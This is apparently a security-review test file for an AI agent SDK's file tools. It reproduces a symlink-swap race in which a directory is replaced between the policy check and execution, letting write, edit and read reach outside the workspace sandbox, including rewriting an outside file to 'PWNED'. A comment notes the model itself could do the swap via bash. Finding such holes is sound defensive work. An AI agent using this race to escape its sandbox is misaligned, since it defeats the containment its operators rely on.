// P6-25 review B（并发与状态一致性）：确定性时序探针。
// 真实组件：app/sdk shell-ask（pre-execute 判定）+ dsh-tool-fs write/edit/read 的 execute
// + dsh-fs-sandbox SandboxedFileSystem（fence 二次校验 + fs-local 原子写）+ fs-observation-policy。
// 唯一替身：ctx 外壳（服务注册表 / waterfall / emit），以及在「pre-execute 返回后、execute
// 调用前」插入的 swap 钩子（rename 真目录 + 原地放符号链接）。不用循环、不碰运气。
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { existsSync, mkdirSync, mkdtempSync, readFileSync, renameSync, symlinkSync, writeFileSync } from 'node:fs'
import { join } from 'node:path'

const SDK = '/home/lingxufeng/bot/app/sdk'
const PNPM = `${SDK}/node_modules/.pnpm`
const shellAsk = await import(`${SDK}/src/policy/shell-ask.mjs`)
const toolFs = await import(`${PNPM}/@deepseek-ai+dsh-tool-fs@0.2.2-alpha.2_4ddf23c76af33848b24300991507a126/node_modules/@deepseek-ai/dsh-tool-fs/lib/index.js`)
const { SandboxedFileSystem } = await import(`${PNPM}/@deepseek-ai+dsh-fs-sandbox@0.2.2-alpha.2_66582059a9054c7fe59a89132d684204/node_modules/@deepseek-ai/dsh-fs-sandbox/lib/index.js`)
const obsPolicy = await import(`${PNPM}/@deepseek-ai+dsh-fs-observation-policy@0.2.2-alpha.2_@deepseek-ai+cordis@4.0.6-alpha.1__aea6fc436b2b53da7b1a5f0e9b0e2192/node_modules/@deepseek-ai/dsh-fs-observation-policy/lib/index.js`)

const BASE = '/tmp/vfy-r-p625-b'
const ALLOW = Symbol('next() = shell-ask 放行')

function harness() {
  const root = mkdtempSync(join(BASE, 'run-'))
  const ws = join(root, 'ws')
  const outside = join(root, 'outside') // 区外（工作区子树之外），位于宿主 /tmp 下 = fence 可写根
  mkdirSync(join(ws, 'sub'), { recursive: true })
  mkdirSync(outside)
  const policy = { mode: 'workspace-write', workspaceRoot: ws }
  const sandboxPolicy = { defaultMode: 'workspace-write', resolve: () => policy }
  // SandboxedFileSystem 的方法全部真实；只绕开 cordis Service 构造器（字段与构造器一致）。
  const fs = Object.create(SandboxedFileSystem.prototype)
  Object.assign(fs, { config: { cwd: ws, diffBasisMaxBytes: 1 << 20 }, internals: {}, locks: new Map(), defaultMode: 'workspace-write' })
  const listeners = new Map()
  const tools = new Map()
  const ctx = {
    fs,
    sandboxPolicy,
    workingDirectory: { ensure: async () => ws },
    systemPrompt: { section() {}, getSectionOrder: () => 0 },
    tools: { register: (t) => tools.set(t.name, t), get: (n) => tools.get(n) },
    get: (n) => ({ fs, sandboxPolicy, workingDirectory: ctx.workingDirectory }[n]),
    on: (ev, fn) => listeners.set(ev, [...(listeners.get(ev) ?? []), fn]),
    effect() {},
    inject() {},
    waterfall: async (ev, target, exec, fallback) => {
      const fns = listeners.get(ev) ?? []
      return fns.length ? fns[0](target, exec) : fallback()
    },
    emit: (ev, ...a) => (listeners.get(ev) ?? []).forEach((fn) => fn(...a)),
  }
  obsPolicy.apply(ctx)
  toolFs.apply(ctx, { read: true, readImage: false, write: true, edit: true, readLimit: 2000, readMaxLineLength: 2000, readMaxBytes: 1 << 20, readStreamMinSize: 1 << 20 })
  // policyStatePaths 指向从未存在的文件 = L-7 R6「从未 provision」→ 文件工具门开（生产默认态）。
  shellAsk.apply(ctx, { policyStatePaths: [join(root, 'state', 'policy-state.json')] })
  const preExecute = listeners.get('tools/pre-execute')[0]
  const agent = { session: { header: { id: 's1' } } } // 同一会话对象（observation-policy 按 session 对象记账）
  const exec = (name, args) => ({ name, arguments: args, agent, signal: new AbortController().signal })
  /** 一次完整调用：pre-execute → [hook] → execute。返回 { decision, result|error }。 */
  async function call(name, args, hook) {
    const e = exec(name, args)
    const decision = await preExecute(e, () => ALLOW)
    if (decision !== ALLOW) return { decision }
    if (hook) hook() // ← 确定性接缝：判定已返回、execute 尚未调用
    try {
      return { decision, result: await tools.get(name).execute(args, e) }
    } catch (error) {
      return { decision, error }
    }
  }
  /** 把 ws/sub 换成指向区外目录的符号链接（模型可经工作区内 bash 做到：工作区 rw bind）。 */
  const swap = () => { renameSync(join(ws, 'sub'), join(ws, 'sub.orig')); symlinkSync(outside, join(ws, 'sub')) }
  return { root, ws, outside, call, swap }
}

test('对照：无替换时 write 落在工作区内', async () => {
  const h = harness()
  const r = await h.call('write', { file_path: 'sub/a.txt', content: 'A' })
  assert.equal(r.decision, ALLOW)
  assert.equal(r.error, undefined)
  assert.equal(readFileSync(join(h.ws, 'sub', 'a.txt'), 'utf8'), 'A')
})

test('对照：判定前已是区外软链 → shell-ask 直接 deny（P6-25 格④）', async () => {
  const h = harness()
  h.swap()
  const r = await h.call('write', { file_path: 'sub/a.txt', content: 'A' })
  assert.equal(r.decision.kind, 'deny')
  assert.equal(existsSync(join(h.outside, 'a.txt')), false)
})

test('Q1 write：pre-execute 放行后、execute 前把 sub 换成区外软链 → 文件落在哪', async () => {
  const h = harness()
  const r = await h.call('write', { file_path: 'sub/race.txt', content: 'RACED' }, h.swap)
  console.log('[Q1-write] decision=allow', 'error=', r.error?.code ?? null, 'result.path=', r.result?.path)
  console.log('[Q1-write] outside/race.txt exists=', existsSync(join(h.outside, 'race.txt')), ' ws/sub.orig/race.txt exists=', existsSync(join(h.ws, 'sub.orig', 'race.txt')))
  assert.equal(r.decision, ALLOW)
  // 观察到的事实（CONFIRMED 断言）：execute 重新 resolve 后跟随软链，fence 二次校验只认
  // writableRoots（含宿主 /tmp），于是写入落到区外。
  assert.equal(r.error, undefined)
  assert.equal(readFileSync(join(h.outside, 'race.txt'), 'utf8'), 'RACED')
  assert.equal(existsSync(join(h.ws, 'sub.orig', 'race.txt')), false)
})

test('Q1 read+edit：两次都在判定后换链 → 区外已有文件被改写', async () => {
  const h = harness()
  writeFileSync(join(h.outside, 'victim.txt'), 'hello\n')
  writeFileSync(join(h.ws, 'sub', 'victim.txt'), 'hello\n') // 区内同名诱饵，使判定看到的是区内文件
  const swapOnce = () => h.swap()
  const swapBack = () => { renameSync(join(h.ws, 'sub'), join(h.ws, 'sub.link')); renameSync(join(h.ws, 'sub.orig'), join(h.ws, 'sub')) }
  // 第一步：read 在判定后换链 → observation 记下区外 targetKey 的版本
  const rd = await h.call('read', { file_path: 'sub/victim.txt' }, swapOnce)
  assert.equal(rd.decision, ALLOW)
  assert.equal(rd.error, undefined, String(rd.error))
  swapBack() // 换回真目录，让 edit 的判定看到区内
  const reswap = () => { renameSync(join(h.ws, 'sub'), join(h.ws, 'sub.orig')); renameSync(join(h.ws, 'sub.link'), join(h.ws, 'sub')) }
  const ed = await h.call('edit', { file_path: 'sub/victim.txt', old_string: 'hello', new_string: 'PWNED' }, reswap)
  console.log('[Q1-edit] decision=allow error=', ed.error?.code ?? null, 'outside/victim.txt=', JSON.stringify(readFileSync(join(h.outside, 'victim.txt'), 'utf8')))
  assert.equal(ed.decision, ALLOW)
  assert.equal(ed.error, undefined, String(ed.error))
  assert.equal(readFileSync(join(h.outside, 'victim.txt'), 'utf8'), 'PWNED\n')
  assert.equal(readFileSync(join(h.ws, 'sub.orig', 'victim.txt'), 'utf8'), 'hello\n')
})

test('Q2 无缓存：第一次 write 放行后替换目录，第二次 write 重新判定 → deny', async () => {
  const h = harness()
  const first = await h.call('write', { file_path: 'sub/one.txt', content: '1' })
  assert.equal(first.decision, ALLOW)
  assert.equal(readFileSync(join(h.ws, 'sub', 'one.txt'), 'utf8'), '1')
  h.swap() // 两次调用之间（静态）替换
  const second = await h.call('write', { file_path: 'sub/two.txt', content: '2' })
  console.log('[Q2] second decision=', JSON.stringify(second.decision))
  assert.equal(second.decision.kind, 'deny')
  assert.match(second.decision.reason, /write-outside-workspace denied/)
  assert.equal(existsSync(join(h.outside, 'two.txt')), false)
  // 同一目标键再写一次（与第一次完全相同的参数）也不复用旧结论
  const again = await h.call('write', { file_path: 'sub/one.txt', content: '1b' })
  assert.equal(again.decision.kind, 'deny')
})

test('旁支（范围外，P5-21 起）read：判定后换链到非 /tmp 区外目录 → 无卡读到区外内容（读不经 fence）', async () => {
  const h = harness()
  writeFileSync(join(h.ws, 'sub', 'package.json'), '{"decoy":true}\n')
  const target = '/home/lingxufeng/bot/app/sdk' // 区外、非宿主 /tmp、非凭证（无害项目文件）
  const swapFar = () => { renameSync(join(h.ws, 'sub'), join(h.ws, 'sub.orig')); symlinkSync(target, join(h.ws, 'sub')) }
  const rd = await h.call('read', { file_path: 'sub/package.json' }, swapFar)
  const real = readFileSync(join(target, 'package.json'), 'utf8').split('\n')[1].trim() // 真文件第 2 行
  const dump = JSON.stringify(rd.result ?? rd.error?.message)
  console.log('[side-read] decision=allow error=', rd.error?.code ?? null, 'result 含区外真文件第 2 行', JSON.stringify(real), '=', dump.includes(JSON.stringify(real).slice(1, -1)), '含诱饵=', dump.includes('decoy'))
  console.log('[side-read] result head:', dump.slice(0, 200))
  assert.equal(rd.decision, ALLOW)
  assert.equal(rd.error, undefined)
  assert.ok(dump.includes(JSON.stringify(real).slice(1, -1)))
  assert.doesNotMatch(String(JSON.stringify(rd.result)), /decoy/)
})
